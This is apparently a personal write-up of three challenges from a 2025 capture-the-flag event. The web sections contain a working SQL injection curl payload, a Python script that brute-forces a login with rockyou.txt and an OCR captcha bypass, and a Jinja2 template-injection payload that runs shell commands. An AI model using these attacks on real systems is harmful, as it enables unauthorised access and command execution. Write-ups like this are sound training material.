---
title: "Blackberry-CCoe-Anniversary CTF 2025 - Writeup"
date: 2025-05-09
categories: [CTF, Writeup]
tags: [Reverse Engineering, web]
image: assets/writeups/BBCTF/BBCTF.png
---

## web

## Challenge name : SQLI Series - 1

**DESCRIPTION**
This store is only for my customers to visit and do online purchase. There are Apple, Banana and Cherry. Nothing else right?

First, we were given a Dockerfile to set up the challenge on our own server, along with a link to the web-based challenge, which had a fruit-themed interface. The first thing I tried was entering a - character in the input field to check for a SQL error, since the challenge name hinted at an SQL injection. However, instead of an error, the response I got was simply "Forbidden".

![img](assets/writeups/BBCTF/BBCTF1.png)
![img](assets/writeups/BBCTF/BBCTF2.png)

After that, I downloaded the Dockerfile and set it up on my own server. While inspecting the setup, I found a hint  the application only accepts requests with a specific User-Agent header: UMCS-CTF.

![img](assets/writeups/BBCTF/BBCTF3.png)

Next, I asked ChatGPT what to do with all the findings I had so far, and it provided me with a potential payload to try: 

```sh
  curl -X POST http://157.180.92.15:5001/ \
  -H "User-Agent: UMCS-CTF" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data "search=%' UNION SELECT 1, (SELECT flag_value FROM flag) -- -"
```
And get the flag
 
 ![img](assets/writeups/BBCTF/BBCTF4.png)

 the flag is bbctf{user_agent_is_not_enough_to_prevent_sqli!}


## Challenge Name : Sekure Note

**Description** I dont think you are able to get the flag. The captcha is too strong :(

Note: This challenge's login is meant to be bruted. Check source code for which wordlist to use :)

We were given a login link and a Dockerfile to set up the challenge on our own server. After setting it up, I opened the app.py file to look for any hints. There, I found hardcoded credentials  `username: admin` and `password: RANDOMPASSWORD` along with a comment referencing `#rockyou`, suggesting that the password can be brute-forced. If the login is successful, it redirects the user to the /admin/note page.

![img](assets/writeups/BBCTF/BBCTF5.png)

Next, I asked ChatGPT to help brute-force the login page using the username admin and passwords from the rockyou.txt wordlist. The login page also had a captcha, so GPT used OCR (Optical Character Recognition) to bypass it. Eventually, the correct password was found: peaches. Here's the script used:
 

```python
import requests
from PIL import Image
from io import BytesIO
import pytesseract

# Optional (kalau kau pakai Windows)
# pytesseract.pytesseract.tesseract_cmd = r'C:\Program Files\Tesseract-OCR\tesseract.exe'

url = 'http://157.180.92.15:7999/'
login_url = f'{url}/'  # or /login kalau ada
rockyou_path = 'rockyou.txt'  # make sure file ada

s = requests.Session()

# Step 1: Get login page and captcha image
r = s.get(login_url)
# Parse captcha image URL
from bs4 import BeautifulSoup
soup = BeautifulSoup(r.text, 'html.parser')
captcha_img_tag = soup.find('img')  # or more specific if needed
captcha_src = captcha_img_tag['src']
if not captcha_src.startswith('http'):
    captcha_src = url + captcha_src

# Step 2: Download captcha image
captcha_img_resp = s.get(captcha_src)
captcha_img = Image.open(BytesIO(captcha_img_resp.content))

# Step 3: OCR the captcha
captcha_text = pytesseract.image_to_string(captcha_img).strip()
print('[*] OCR Captcha:', captcha_text)

# Step 4: Bruteforce with rockyou.txt
for pw in open(rockyou_path, 'r', encoding='latin-1'):
    pw = pw.strip()
    data = {
        'username': 'admin',
        'password': pw,
        'captcha': captcha_text
    }
    res = s.post(login_url, data=data, allow_redirects=False)

    # Check login success
    if res.status_code == 302 and '/admin/notes' in res.headers.get('Location', ''):
        print(f'[+] SUCCESS! Password: {pw}')
        break
else:
    print('[-] Password not found in rockyou.txt')
```

After logging in, I was redirected to the admin notes page. To test for SSTI (Server-Side Template Injection), I entered the payload `[{ 7*7 }]`. If the output returns 49, it confirms that the template engine is evaluating the expression  which means SSTI is present.

Here’s the result:
![img](assets/writeups/BBCTF/BBCTF6.png)

Next, I began crafting a payload to exploit the SSTI vulnerability. Since the app was using HTML with Jinja2, I tested several variations. The one that worked for me was:

{% raw %}
```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls ../cat flag.txt')|attr('read')()}}
```
{% endraw %}

![img](assets/writeups/BBCTF/BBCTF7.png)

The Flag Is BBCTF{c4ptcha_4nd_sst1_m4st3r!}

## Reverse Engineering

## Challenge Name : Trust-issue

Given an elf file the first step I do is check file type and use strings if there any important things . Got base 64 but it just a bait for the next step 

![img](assets/writeups/BBCTF/BBCTF8.png)

![img](assets/writeups/BBCTF/BBCTF9.png)

When I decode it just got the fake flag . Next we use `ida` to dissasamble it decompyle it and see the pseudocode .There's a lot of main so you need to find the real main and follow the flow. Upon analyze it I found there is hexString the input before user enter the input copy it and put it on llm with a proper prompt and it give a python script . Run the script and we get the flag .

![img](assets/writeups/BBCTF/BBCTF10.png)

![img](assets/writeups/BBCTF/BBCTF11.png)

Here is the Flag : bbctf{N0t_A11_3ntry_St4rts_Fr0m_M41N}

![img](assets/writeups/BBCTF/BBCTF13.png)








